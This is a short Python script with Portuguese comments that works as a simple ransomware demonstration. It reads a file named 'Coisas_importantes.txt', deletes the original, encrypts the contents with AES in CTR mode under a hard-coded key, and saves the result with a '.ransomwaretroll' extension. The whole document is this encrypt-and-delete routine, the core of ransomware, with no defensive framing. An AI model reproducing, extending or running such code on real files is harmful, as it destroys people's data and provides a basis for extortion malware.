import os
import pyaes

## abrir o arquivo a ser criptografado

file_name = 'Coisas_importantes.txt'
file = open(file_name, 'rb')
file_data = file.read()
file.close()


## remover o arquivo original

os.remove(file_name)

## definir a chave de encriptacao

Key = b"DPiuOllUQJBO00mk"
aes = pyaes.AESModeOfOperationCTR(Key)

## Criptografando

crypto_data = aes.encrypt(file_data)

##Salvar o arquivo criptografado

new_file = file_name + '.ransomwaretroll'
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()